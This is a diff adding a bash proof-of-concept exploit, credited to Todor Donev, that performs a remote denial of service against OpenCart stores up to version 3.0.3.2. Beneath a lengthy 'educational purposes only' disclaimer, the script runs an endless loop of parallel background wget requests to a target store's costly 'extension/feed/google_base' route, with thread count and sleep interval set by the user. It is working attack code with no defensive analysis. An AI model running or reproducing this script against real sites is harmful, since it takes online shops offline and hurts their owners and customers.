@@ -1,0 +1,58 @@
+#!/bin/bash
+#
+#  Opencart <= 3.0.3.2 'extension/feed/google_base' Remote Denial of Service PoC exploit
+#
+#  Copyright 2019 (c) Todor Donev <todor.donev at gmail.com>
+#
+#  PoC exploit, just for test...
+#  Tested on store with added more than 1000 products
+#  Usage: ./cartkiller.sh store_url threads sleep
+#  Example: ./cartkiller.sh https://store_name 50 5
+#
+#
+#  Disclaimer:
+#  This or previous programs is for Educational 
+#  purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the 
+#  fact that Todor Donev is not liable for any 
+#  damages caused by direct or indirect use of the 
+#  information or functionality provided by these 
+#  programs. The author or any Internet provider 
+#  bears NO responsibility for content or misuse 
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact 
+#  that any damage (dataloss, system crash, 
+#  system compromise, etc.) caused by the use 
+#  of these programs is not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!
+#
+
+echo "Opencart <= 3.0.3.2 'extension/feed/google_base' Remote Denial of Service PoC exploit"
+echo
+echo "Copyright 2019 (c) Todor Donev <todor.donev at gmail.com>"
+echo
+echo "PoC exploit, just for test..."
+echo "Tested on store with added more than 1000 products"
+
+if [ -z "$3" ]; then
+echo Usage: "$0" store_url threads sleep
+echo Example: "$0" https://store_name 50 5
+exit 4
+fi
+ 
+url="$1"
+threads="$2"
+sleep="$3"
+while :
+do
+        for ((i=1;i<=$2;i++)); 
+        do 	
+	    wget "$url/index.php?route=extension/feed/google_base" --user-agent="Mozilla/5.0 (OpenCart Killer v2 google_base Denial Of Service)" --quiet -O /dev/null -o /dev/null &
+        done
+#
+# Sleep between loops..
+#      
+sleep $sleep
+done
